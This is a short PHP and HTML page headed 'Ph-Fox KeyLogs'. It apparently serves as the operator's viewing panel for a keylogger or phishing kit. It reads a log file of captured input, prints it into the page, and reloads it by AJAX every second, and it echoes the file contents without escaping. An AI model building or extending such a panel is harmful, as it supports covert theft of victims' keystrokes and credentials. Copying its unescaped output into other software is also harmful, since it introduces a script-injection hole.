<?php 
#error_reporting(0);
?>
<!DOCTYPE html>
<html>
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta charset="utf-8">
	<script type="text/javascript" src="js/jquery.min.js"></script>
	<title>PhFox K-Log</title>
</head>
<body >
	<div class="heading">
		<h1>Ph-Fox KeyLogs</h1>
	</div>
	<div id="logs" class="logs">
		<?php 
		$handle = fopen("logz.txt", "r" );
		$contents = fread($handle, filesize ( "logz.txt" ));
		fclose ($handle);
		echo '<h3>'.$contents.'</h3>';
		?>
	</div>
</body>
<script>
function loadLog(){    
    var oldscrollHeight = $("#chatbox").attr("scrollHeight") - 20;
    $.ajax({
        url: "logz.txt",
        cache: false,
        success: function(html){       
            $("#logs").html(html);       
            var newscrollHeight = $("#logs").attr("scrollHeight") - 20;
            if(newscrollHeight > oldscrollHeight){
                $("#logs").animate({ scrollTop: newscrollHeight }, 'normal');
            }              
        },
    });
}
setInterval (loadLog, 1000);
</script>
<style type="text/css">
	body{
		background-color: black;
		margin: 1;
		height: 90vh;
	}
	.heading{
		margin: 0 auto;
		display: flex;
		align-items: center;
		justify-content: center;
		border: 2px solid darkcyan;
		background-color: #303030;
	}
	.heading h1{
		color: cyan;
		font-family: sans-serif;
	}
	.logs{
		margin: 0px auto;
		margin-top: 10px;
		justify-content: center;
		background-color: #101010;
		height: 90%;
		font-size: 20px;
		overflow: auto;
		text-align: center;
		margin-bottom:5px;
	}
	.logmsg{
		border: 1px solid red;
		color: darkcyan;
		font-family: sans-serif;
	}
	.logmsg tr{
		box-shadow: 0px 0px 3px 1px cyan;
		text-align: center;
	}

</style>
</html>
